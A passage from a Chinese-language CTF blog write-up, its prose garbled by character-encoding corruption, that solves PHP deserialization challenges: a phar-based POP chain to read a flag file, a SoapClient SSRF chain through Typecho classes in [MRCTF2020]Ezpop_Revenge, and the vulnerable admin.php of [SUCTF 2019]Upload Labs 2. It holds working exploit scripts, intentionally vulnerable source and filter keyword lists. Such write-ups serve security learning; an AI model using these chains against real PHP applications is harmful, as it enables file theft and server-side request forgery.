<p>å¼€é¢˜æ˜¯ä¸€ä¸ªï¼Œèƒ½å¤ŸæŸ¥çœ‹æ–‡ä»¶å’Œä¸Šä¼ æ–‡ä»¶ï¼Œä¸Šä¼ å°é©¬çš„å›¾ç‰‡é©¬ï¼Œåªæç¤ºä¸Šä¼ æˆåŠŸï¼Œä¹Ÿæ²¡æœ‰ç»™ä¸Šä¼ è·¯å¾„ï¼Œåœ¨æŸ¥çœ‹æ–‡ä»¶é‚£é‡Œæ‰¾åˆ°åˆ©ç”¨ç‚¹</p>
<img src="/2020/05/30/unserialize/4.png" class="">

<p>é€ä¸ªçœ‹åŒ…å«çš„æ–‡ä»¶</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">#file.php</span></span><br><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">header(<span class="string">"content-type:text/html;charset=utf-8"</span>);  </span><br><span class="line"><span class="keyword">include</span> <span class="string">'function.php'</span>; </span><br><span class="line"><span class="keyword">include</span> <span class="string">'class.php'</span>; </span><br><span class="line">ini_set(<span class="string">'open_basedir'</span>,<span class="string">'/var/www/html/'</span>); </span><br><span class="line">$file = $_GET[<span class="string">"file"</span>] ? $_GET[<span class="string">'file'</span>] : <span class="string">""</span>; </span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">empty</span>($file)) &#123; </span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;h2&gt;There is no file to show!&lt;h2/&gt;"</span>; </span><br><span class="line">&#125; </span><br><span class="line">$show = <span class="keyword">new</span> Show(); </span><br><span class="line"><span class="keyword">if</span>(file_exists($file)) &#123; </span><br><span class="line">    $show-&gt;source = $file; </span><br><span class="line">    $show-&gt;_show(); </span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (!<span class="keyword">empty</span>($file))&#123; </span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'file doesn\'t exists.'</span>); </span><br><span class="line">&#125; </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">#class.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">C1e4r</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $test;</span><br><span class="line">    <span class="keyword">public</span> $str;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($name)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;str = $name;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;test = <span class="keyword">$this</span>-&gt;str;</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;test;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Show</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $source;</span><br><span class="line">    <span class="keyword">public</span> $str;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($file)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;source = $file;   <span class="comment">//$this-&gt;source = phar://phar.jpg</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;source;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $content = <span class="keyword">$this</span>-&gt;str[<span class="string">'str'</span>]-&gt;source;</span><br><span class="line">        <span class="keyword">return</span> $content;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__set</span><span class="params">($key,$value)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;$key = $value;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">_show</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">'/http|https|file:|gopher|dict|\.\.|f1ag/i'</span>,<span class="keyword">$this</span>-&gt;source)) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">'hacker!'</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            highlight_file(<span class="keyword">$this</span>-&gt;source);</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">"/http|https|file:|gopher|dict|\.\./i"</span>, <span class="keyword">$this</span>-&gt;source)) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"hacker~"</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;source = <span class="string">"index.php"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $file;</span><br><span class="line">    <span class="keyword">public</span> $params;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;params = <span class="keyword">array</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span><span class="params">($key)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;get($key);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">get</span><span class="params">($key)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;params[$key])) &#123;</span><br><span class="line">            $value = <span class="keyword">$this</span>-&gt;params[$key];</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $value = <span class="string">"index.php"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;file_get($value);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">file_get</span><span class="params">($value)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $text = base64_encode(file_get_contents($value));</span><br><span class="line">        <span class="keyword">return</span> $text;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>åœ¨class.phpä¸­çœ‹åˆ°æœ‰æç¤ºpharï¼Œåº”è¯¥æ˜¯è¦åˆ©ç”¨phar</p>
<p>å…ˆçœ‹show()ç±»ï¼Œè¿‡æ»¤äº†f14gï¼Œæœ‰ä¸ªtoString()é­”æœ¯æ–¹æ³•å¯ä»¥ç”¨</p>
<p>å†çœ‹Test()ç±»__get()é­”æœ¯æ–¹æ³•è°ƒç”¨getå‡½æ•°ï¼Œgetå‡½æ•°ä¼šè°ƒç”¨file_getå‡½æ•°ï¼Œå‡½æ•°ä¼šè¿”å›åŒ…å«æ–‡ä»¶çš„base64ç¼–ç çš„å†…å®¹</p>
<p>æœ€åå†çœ‹C1e4r()ç±»ï¼Œ__destruct()é­”æœ¯æ–¹æ³•ä¸­æœ‰è¾“å‡ºï¼Œè¿™å°±å¯ä»¥è°ƒç”¨show()ç±»ä¸­çš„tostring()é­”æœ¯æ–¹æ³•ï¼Œå†é€šè¿‡è®©$this-&gt;str[â€˜strâ€™]=Test()ç±»ï¼Œä¼šè§¦å‘__get()é­”æœ¯æ–¹æ³•ï¼Œå°±å¯ä»¥æ‹¿åˆ°æƒ³è¦çš„æ•°æ®</p>
<p>popé“¾</p>
<p>1.åˆ©ç”¨C1e4rç±»çš„<code>__destruct()</code>ä¸­çš„<code>echo $this-&gt;test</code><br>2.è§¦å‘Showç±»çš„<code>__toString()</code><br>3.åˆ©ç”¨Showç±»çš„<code>$content = $this-&gt;str[&#39;str&#39;]-&gt;source</code><br>4.è§¦å‘Testç±»çš„<code>__get()</code><br>5.æˆåŠŸåˆ©ç”¨<code>file_get()</code>è¯»æ–‡ä»¶</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">C1e4r</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">	<span class="keyword">public</span> $test;</span><br><span class="line">	<span class="keyword">public</span> $str;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Show</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $source;</span><br><span class="line">    <span class="keyword">public</span> $str;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $file;</span><br><span class="line">    <span class="keyword">public</span> $params;</span><br><span class="line">&#125;</span><br><span class="line">$a = <span class="keyword">new</span> Test();</span><br><span class="line">$a-&gt;params[<span class="string">'source'</span>] = <span class="string">"/var/www/html/f1ag.php"</span>;</span><br><span class="line">$b = <span class="keyword">new</span> Show();</span><br><span class="line">$c = <span class="keyword">new</span> C1e4r();</span><br><span class="line">$b-&gt;str[<span class="string">'str'</span>] = $a;</span><br><span class="line">$c-&gt;str = $b; </span><br><span class="line"></span><br><span class="line">$phar = <span class="keyword">new</span> Phar(<span class="string">'nice.phar'</span>);</span><br><span class="line">$phar -&gt;startBuffering();</span><br><span class="line">$phar-&gt;setStub(<span class="string">'&lt;?php __HALT_COMPILER();?&gt;'</span>);<span class="comment">//å›ºå®šæ ¼å¼</span></span><br><span class="line">$phar-&gt;addFromString(<span class="string">'test.txt'</span>,<span class="string">'test'</span>);<span class="comment">//ç­¾å</span></span><br><span class="line">$phar-&gt;setMetadata($c);</span><br><span class="line">$phar-&gt;stopBuffering();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>ç”Ÿæˆçš„æ–‡ä»¶æ”¹ä¸€ä¸‹åç¼€åï¼Œæ”¹ä¸ºjpgå†ä¸Šä¼ ï¼Œè¿™é‡Œæ–‡ä»¶ä¸Šä¼ åçš„å­˜å‚¨åä¸ºï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> md5(<span class="string">'nice.jpg174.0.0.2'</span>)</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">#5f9b471df88c9f1ed164a76a5121a2eb</span></span><br></pre></td></tr></table></figure>

<img src="/2020/05/30/unserialize/5.png" class="">

<h3 id="MRCTF2020-Ezpop-Revenge"><a href="#MRCTF2020-Ezpop-Revenge" class="headerlink" title="[MRCTF2020]Ezpop_Revenge"></a>[MRCTF2020]Ezpop_Revenge</h3><p>ä¸€é“ååºåˆ—åŒ–é¢˜ï¼Œç»™äº†Typechoæ¡†æ¶çš„æºç ï¼Œè¦è‡ªå·±æ‰¾åˆ©ç”¨é“¾ï¼Œæ‰¾äº†ä¸€ç¯‡æ–‡ç« <a href="http://blog.nsfocus.net/typecho-vulnerability-analysis/å…ˆçœ‹ç€" target="_blank" rel="noopener">http://blog.nsfocus.net/typecho-vulnerability-analysis/å…ˆçœ‹ç€</a></p>
<p>å¼€é¢˜ï¼Œå°±æ˜¯ä¸€ä¸ªä¸æˆå‹çš„typechoé¡µé¢ï¼Œæ‰«ä¸€ä¸‹ç›®å½•ï¼Œ<a href="http://www.zip,æ²¡æœ‰æ‰¾åˆ°install.phpæ–‡ä»¶ï¼Œè¿™æ¡é“¾å­ä¸é€šï¼ŒæŸ¥æ‰¾unserialize()é­”æœ¯æ–¹æ³•" target="_blank" rel="noopener">www.zip,æ²¡æœ‰æ‰¾åˆ°install.phpæ–‡ä»¶ï¼Œè¿™æ¡é“¾å­ä¸é€šï¼ŒæŸ¥æ‰¾unserialize()é­”æœ¯æ–¹æ³•</a></p>
<p>åœ¨usr/plugins/HelloWorld/Plugin.phpä¸­</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">action</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="keyword">isset</span>($_SESSION)) session_start();</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>($_REQUEST[<span class="string">'admin'</span>])) var_dump($_SESSION);</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'C0incid3nc3'</span>])) &#123;</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">"/file|assert|eval|[`\'~^?&lt;&gt;$%]+/i"</span>,base64_decode($_POST[<span class="string">'C0incid3nc3'</span>])) === <span class="number">0</span>)</span><br><span class="line">            unserialize(base64_decode($_POST[<span class="string">'C0incid3nc3'</span>]));</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"Not that easy."</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>åªè¦ä¼ å…¥äº†adminå°±ä¼šè¾“å‡ºsession</p>
<p>æ¥ç€æ‰¾__wakeup()é­”æœ¯æ–¹æ³•ï¼Œè¿˜æ˜¯åŒä¸€ä¸ªæ–‡ä»¶</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">HelloWorld_DB</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $flag=<span class="string">"MRCTF&#123;this_is_a_fake_flag&#125;"</span>;</span><br><span class="line">    <span class="keyword">private</span> $coincidence;</span><br><span class="line">    <span class="function"><span class="keyword">function</span>  <span class="title">__wakeup</span><span class="params">()</span></span>&#123;</span><br><span class="line">        $db = <span class="keyword">new</span> Typecho_Db(<span class="keyword">$this</span>-&gt;coincidence[<span class="string">'hello'</span>], <span class="keyword">$this</span>-&gt;coincidence[<span class="string">'world'</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>ä¸»è¦ååºåˆ—åŒ–å°±ä¸€å®šä¼šè§¦å‘__wakeup()é­”æœ¯æ–¹æ³•ï¼Œè¿™é‡Œå®ä¾‹åŒ–äº†Typecho_Dbç±»ï¼Œè·Ÿè¿›ä¸€ä¸‹</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($adapterName, $prefix = <span class="string">'typecho_'</span>)</span></span></span><br><span class="line"><span class="function"> </span>&#123;</span><br><span class="line">     <span class="comment">/** è·å–é€‚é…å™¨åç§° */</span></span><br><span class="line">     <span class="keyword">$this</span>-&gt;_adapterName = $adapterName;</span><br><span class="line"></span><br><span class="line">     <span class="comment">/** æ•°æ®åº“é€‚é…å™¨ */</span></span><br><span class="line">     $adapterName = <span class="string">'Typecho_Db_Adapter_'</span> . $adapterName;</span><br><span class="line"></span><br><span class="line">     <span class="keyword">if</span> (!call_user_func(<span class="keyword">array</span>($adapterName, <span class="string">'isAvailable'</span>))) &#123;</span><br><span class="line">         <span class="keyword">throw</span> <span class="keyword">new</span> Typecho_Db_Exception(<span class="string">"Adapter &#123;$adapterName&#125; is not available"</span>);<span class="comment">//__toString()</span></span><br><span class="line">     &#125;</span><br></pre></td></tr></table></figure>

<p>è¿™é‡Œå°†$adapterNameè¿›è¡Œäº†æ‹¼æ¥ï¼Œè¿™å°±ä¼šè§¦å‘æŸä¸ªç±»çš„__toString()é­”æœ¯æ–¹æ³•ï¼Œæ‰¾ä¸€ä¸‹toString()é­”æœ¯æ–¹æ³•</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">switch</span> (<span class="keyword">$this</span>-&gt;_sqlPreBuild[<span class="string">'action'</span>]) &#123;</span><br><span class="line">        <span class="keyword">case</span> Typecho_Db::SELECT:</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;_adapter-&gt;parseSelect(<span class="keyword">$this</span>-&gt;_sqlPreBuild);</span><br><span class="line">        <span class="keyword">case</span> Typecho_Db::INSERT:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">'INSERT INTO '</span></span><br><span class="line">            . <span class="keyword">$this</span>-&gt;_sqlPreBuild[<span class="string">'table'</span>]</span><br><span class="line">            . <span class="string">'('</span> . implode(<span class="string">' , '</span>, array_keys(<span class="keyword">$this</span>-&gt;_sqlPreBuild[<span class="string">'rows'</span>])) . <span class="string">')'</span></span><br><span class="line">            . <span class="string">' VALUES '</span></span><br><span class="line">            . <span class="string">'('</span> . implode(<span class="string">' , '</span>, array_values(<span class="keyword">$this</span>-&gt;_sqlPreBuild[<span class="string">'rows'</span>])) . <span class="string">')'</span></span><br><span class="line">            . <span class="keyword">$this</span>-&gt;_sqlPreBuild[<span class="string">'limit'</span>];</span><br><span class="line">        <span class="keyword">case</span> Typecho_Db::DELETE:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">'DELETE FROM '</span></span><br><span class="line">            . <span class="keyword">$this</span>-&gt;_sqlPreBuild[<span class="string">'table'</span>]</span><br><span class="line">            . <span class="keyword">$this</span>-&gt;_sqlPreBuild[<span class="string">'where'</span>];</span><br><span class="line">        <span class="keyword">case</span> Typecho_Db::UPDATE:</span><br><span class="line">            $columns = <span class="keyword">array</span>();</span><br><span class="line">            <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;_sqlPreBuild[<span class="string">'rows'</span>])) &#123;</span><br><span class="line">                <span class="keyword">foreach</span> (<span class="keyword">$this</span>-&gt;_sqlPreBuild[<span class="string">'rows'</span>] <span class="keyword">as</span> $key =&gt; $val) &#123;</span><br><span class="line">                    $columns[] = <span class="string">"$key = $val"</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> <span class="string">'UPDATE '</span></span><br><span class="line">            . <span class="keyword">$this</span>-&gt;_sqlPreBuild[<span class="string">'table'</span>]</span><br><span class="line">            . <span class="string">' SET '</span> . implode(<span class="string">' , '</span>, $columns)</span><br><span class="line">            . <span class="keyword">$this</span>-&gt;_sqlPreBuild[<span class="string">'where'</span>];</span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>$this-&gt;_sqlPreBuild[â€˜actionâ€™]çš„å€¼æ˜¯selectçš„è¯ï¼Œä¼šè¿”å›$this-&gt;$_adapter-&gt;parseSelect($this-&gt;_sqlPreBuild)ï¼Œå¦‚æœæŠŠ$_adapterå®ä¾‹åŒ–ä¸ºSoapClientç±»ï¼Œè°ƒç”¨çš„parseSelectæ–¹æ³•ä¸å­˜åœ¨ï¼Œå°±ä¼šè°ƒç”¨__callé­”æœ¯æ–¹æ³•ï¼Œå†é€šè¿‡__callé­”æœ¯æ–¹æ³•æ¥å®ç°SSRF</p>
<p>POPé“¾ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">HelloWorld_DB::wakeup--&gt;</span><br><span class="line">Typecho_Db::__construct(tostring)--&gt;</span><br><span class="line">Typecho_Db_Query::__construct--&gt;</span><br><span class="line">(this-&gt;_adapter&#x3D;new Soapclient)--&gt;</span><br><span class="line">ssrf</span><br></pre></td></tr></table></figure>

<p>åé¢çš„çŸ¥è¯†ç‚¹æ¥è‡ªy1ngå¸ˆå‚…çš„æ–‡ç« ï¼Œé™„ä¸Šå‡ºå¤„<a href="https://www.gem-love.com/ctf/2184.html#EzpopRevenge" target="_blank" rel="noopener">https://www.gem-love.com/ctf/2184.html#EzpopRevenge</a></p>
<p>å°†å­—ç¬¦ä¸²æ”¹å†™æˆåå…­è¿›åˆ¶ï¼Œä¹Ÿå°±æ˜¯å°†è¡¨ç¤ºå­—ç¬¦ä¸²çš„så†™æˆå¤§å†™Sï¼Œè¿™æ ·privateå±æ€§åé¢çš„<code>%00</code>è¿™ä¸ªä¸å¯è§å­—ç¬¦å°±èƒ½å†™æˆ<code>\00</code></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Typecho_Db_Query</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $_sqlPreBuild;</span><br><span class="line">    <span class="keyword">private</span> $_adapter;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $target = <span class="string">'http://127.0.0.1/flag.php'</span>;</span><br><span class="line">        $headers = <span class="keyword">array</span>(</span><br><span class="line">            <span class="string">'X-Forwarded-For: 127.0.0.1'</span>,</span><br><span class="line">            <span class="string">'Cookie: PHPSESSID=a8vkg6l5j5sesvqan5q5s4obr1'</span></span><br><span class="line">        );</span><br><span class="line">        $b = <span class="keyword">new</span> SoapClient(<span class="keyword">null</span>,<span class="keyword">array</span>(<span class="string">'location'</span> =&gt; $target,<span class="string">'user_agent'</span>=&gt;<span class="string">'HyyMbb^^'</span>.join(<span class="string">'^^'</span>,$headers),<span class="string">'uri'</span>      =&gt; <span class="string">"aaab"</span>));</span><br><span class="line">        <span class="keyword">$this</span>-&gt;_sqlPreBuild =<span class="keyword">array</span>(<span class="string">"action"</span>=&gt;<span class="string">"SELECT"</span>);</span><br><span class="line">        <span class="keyword">$this</span>-&gt;_adapter = $b;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">HelloWorld_DB</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $coincidence;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;coincidence = [<span class="string">"hello"</span> =&gt; <span class="keyword">new</span> Typecho_Db_Query()];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$a = <span class="keyword">new</span> HelloWorld_DB();</span><br><span class="line">$aaa = serialize($a);</span><br></pre></td></tr></table></figure>

<p>phpç‰ˆæœ¬é—®é¢˜ï¼Œæ²¡æœ‰å¼„</p>
<p>æœ€åå°±æ˜¯æŠŠç”Ÿæˆçš„payloadç”¨postä¼ è¿‡å»ï¼Œåœ¨getä¼ å…¥adminçš„å€¼å°±èƒ½æ‹¿åˆ°flagäº†</p>
<h3 id="SUCTF-2019-Upload-Labs-2"><a href="#SUCTF-2019-Upload-Labs-2" class="headerlink" title="[SUCTF 2019]Upload Labs 2"></a>[SUCTF 2019]Upload Labs 2</h3><p>ç»™äº†æºç </p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">#admin.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">'config.php'</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Ad</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> $cmd;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> $clazz;</span><br><span class="line">    <span class="keyword">public</span> $func1;</span><br><span class="line">    <span class="keyword">public</span> $func2;</span><br><span class="line">    <span class="keyword">public</span> $func3;</span><br><span class="line">    <span class="keyword">public</span> $instance;</span><br><span class="line">    <span class="keyword">public</span> $arg1;</span><br><span class="line">    <span class="keyword">public</span> $arg2;</span><br><span class="line">    <span class="keyword">public</span> $arg3;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($cmd, $clazz, $func1, $func2, $func3, $arg1, $arg2, $arg3)</span></span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">$this</span>-&gt;cmd = $cmd;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">$this</span>-&gt;clazz = $clazz;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;func1 = $func1;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;func2 = $func2;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;func3 = $func3;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;arg1 = $arg1;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;arg2 = $arg2;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;arg3 = $arg3;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">check</span><span class="params">()</span></span>&#123;</span><br><span class="line"></span><br><span class="line">        $reflect = <span class="keyword">new</span> ReflectionClass(<span class="keyword">$this</span>-&gt;clazz);</span><br><span class="line">        <span class="keyword">$this</span>-&gt;instance = $reflect-&gt;newInstanceArgs();</span><br><span class="line"></span><br><span class="line">        $reflectionMethod = <span class="keyword">new</span> ReflectionMethod(<span class="keyword">$this</span>-&gt;clazz, <span class="keyword">$this</span>-&gt;func1);</span><br><span class="line">        $reflectionMethod-&gt;invoke(<span class="keyword">$this</span>-&gt;instance, <span class="keyword">$this</span>-&gt;arg1);</span><br><span class="line"></span><br><span class="line">        $reflectionMethod = <span class="keyword">new</span> ReflectionMethod(<span class="keyword">$this</span>-&gt;clazz, <span class="keyword">$this</span>-&gt;func2);</span><br><span class="line">        $reflectionMethod-&gt;invoke(<span class="keyword">$this</span>-&gt;instance, <span class="keyword">$this</span>-&gt;arg2);</span><br><span class="line"></span><br><span class="line">        $reflectionMethod = <span class="keyword">new</span> ReflectionMethod(<span class="keyword">$this</span>-&gt;clazz, <span class="keyword">$this</span>-&gt;func3);</span><br><span class="line">        $reflectionMethod-&gt;invoke(<span class="keyword">$this</span>-&gt;instance, <span class="keyword">$this</span>-&gt;arg3);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span>&#123;</span><br><span class="line">        system(<span class="keyword">$this</span>-&gt;cmd);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($_SERVER[<span class="string">'REMOTE_ADDR'</span>] == <span class="string">'127.0.0.1'</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'admin'</span>]))&#123;</span><br><span class="line">        $cmd = $_POST[<span class="string">'cmd'</span>];</span><br><span class="line"></span><br><span class="line">        $clazz = $_POST[<span class="string">'clazz'</span>];</span><br><span class="line">        $func1 = $_POST[<span class="string">'func1'</span>];</span><br><span class="line">        $func2 = $_POST[<span class="string">'func2'</span>];</span><br><span class="line">        $func3 = $_POST[<span class="string">'func3'</span>];</span><br><span class="line">        $arg1 = $_POST[<span class="string">'arg1'</span>];</span><br><span class="line">        $arg2 = $_POST[<span class="string">'arg2'</span>];</span><br><span class="line">        $arg2 = $_POST[<span class="string">'arg3'</span>];</span><br><span class="line">        $admin = <span class="keyword">new</span> Ad($cmd, $clazz, $func1, $func2, $func3, $arg1, $arg2, $arg3);</span><br><span class="line">        $admin-&gt;check();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"You r not admin!"</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

